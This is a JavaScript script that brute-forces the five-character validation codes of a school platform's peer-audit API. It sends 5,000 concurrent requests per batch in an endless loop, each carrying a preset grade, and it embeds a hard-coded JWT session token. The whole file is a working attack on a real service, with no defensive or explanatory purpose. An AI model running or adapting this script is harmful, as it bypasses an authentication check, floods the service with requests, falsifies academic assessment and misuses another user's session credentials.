import fetch from "node-fetch";
globalThis.fetch = fetch;

class CodeCreator {
  constructor(charset, length, start = 0) {
    this.charset = charset;
    this.length = length;

    this.index = start;
  }

  getIndex() {
    return this.index;
  }

  next() {
    let code = [];
    let currentIndex = this.index;
    this.index++;

    for (let i = 0; i < this.length; i++) {
      code.push(this.charset[currentIndex % this.charset.length]);
      currentIndex = Math.floor(currentIndex / this.charset.length);
    }

    return code.join("");
  }
}

let codeCreator = new CodeCreator(
  "abcdefghijklmnopqrstuvwxyz0123456789-_$?",
  5,
  50000
);
const createNewPromise = async () => {
  let grade = 1.2857142857142858;
  let code = codeCreator.next();
  let auditId = 12166;
  let eventId = 20;
  let groupId = 2159;

  let response = await fetch(
    `https://01.kood.tech/api/validation/johvi/div-01/different-maps?grade=${grade}&code=${code}&auditId=${auditId}&eventId=${eventId}&groupId=${groupId}&feedback={}`,
    {
      method: "GET",
      headers: {
        "x-jwt-token":
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMzY5IiwiaWF0IjoxNjUyNjE5NjY1LCJpcCI6IjIxMy4xODAuMTAuNTEsIDE3Mi4yMy4wLjIiLCJleHAiOjE2NTI3MDYwNjUsImh0dHBzOi8vaGFzdXJhLmlvL2p3dC9jbGFpbXMiOnsieC1oYXN1cmEtYWxsb3dlZC1yb2xlcyI6WyJ1c2VyIl0sIngtaGFzdXJhLWNhbXB1c2VzIjoie30iLCJ4LWhhc3VyYS1kZWZhdWx0LXJvbGUiOiJ1c2VyIiwieC1oYXN1cmEtdXNlci1pZCI6IjIzNjkiLCJ4LWhhc3VyYS10b2tlbi1pZCI6ImIzOTk5M2EyLWE5ZDQtNGIzYi05OWU2LTViZmVhYjE1MTJmZSJ9fQ.o_61wAUYeSvtWaMZFCCeg6DOTx9MoOBIT2cT_T5hYFQ",
      },
      redirect: "follow",
    }
  );
  let text = await response.text();

  return text;
};

let promiseList = [];

const populatePromises = () => {
  promiseList = [];

  for (let count = 0; count < 5000; count++) {
    promiseList.push(
      createNewPromise().then((text) => {
        if (text.includes("error")) {
          //throw "Wrong code"
        } else {
          return text;
        }
      })
    );
  }
};

(async () => {
  while (true) {
    populatePromises();

    let text = await Promise.all(promiseList);

    console.log(`${text} We are at counter ${codeCreator.getIndex()}`);
  }
})();

/*
{
    "error": "Audit 12168 is not reachable"
}
*/
